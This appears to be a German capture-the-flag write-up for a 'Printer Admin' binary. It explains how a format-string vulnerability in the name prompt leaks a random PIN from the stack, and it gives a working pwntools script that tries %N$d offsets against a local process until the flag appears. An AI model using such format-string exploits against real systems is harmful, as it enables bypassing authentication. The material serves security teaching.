# Printer Admin

> We developed a new admin interface for our printer. Since some high-class members of our institute queued some secret print jobs, we secured the access with a pin that is random every time. As long as our special technique to reveal the pin is unknown, this should be safe.

Die Challenge möchte einen Namen und eine Pin als Eingabe und beendet nach Eingabe einer falschen Pin mit traurigen Druckergeräuschen.

Laut Challenge-Beschreibung gibt es eine Möglichkeit,die richtige Pin, die jedesmal zufällig erzeugt wird, rauszukriegen. Das kann ja dann nur über die Eingabe des Namens passieren, der anschließend ncohmal ausgegeben wird, und ist bestimmt eine Format-String Schwachstelle. Also werfen wir mal einen Blick in den Quellcode mit Hilfe von Ghidra.

Tatsächlich lässt sich die Namens-Eingabe nutzen, um mit einer Format-String Attacke Zugriff auf die Zufallszahl zu kriegen. Eine gute Erläuterung dazu findet man z.B. hier: https://owasp.org/www-community/attacks/Format_string_attack

Mit `%d` lässt sich die nächste Zahl im Speicher ausgeben. Unsere gesuchte Pin liegt aber nicht direkt an nächster Stelle im Speicher. Dafür kann man etwas wie `%3$d` nutzen, was z.B. die dirttnächste Zahl ausgeben würde. Weil ich nicht alles händisch ausprobieren wollte habe ich ein Script geschireben, das die nächsten 20 Zahlen durchgeht und als Pin ausprobiert. An Stelle 9 wird es fündig und liefert die Flag.

```python
#! /bin/python3

from pwn import *

context.log_level = 'critical'

for i in range(1,20):
        p = process('./printer-admin')
        p.recv() 
        p.sendline(b'%'+str(i).encode()+b'$d')
        r = p.recv()
        pin = r.decode().split('\n')[3]
        p.sendline(pin.encode())
        r = p.recv().decode()
        if ('Show' in r):
                print(f'Working payload: %{i}$d')
                p.sendline(b'2')
                p.recvuntil(b'\n---\n')
                r = p.recv()
                print(r.decode().strip())
                p.close()
                break
        else:
	        p.close()
```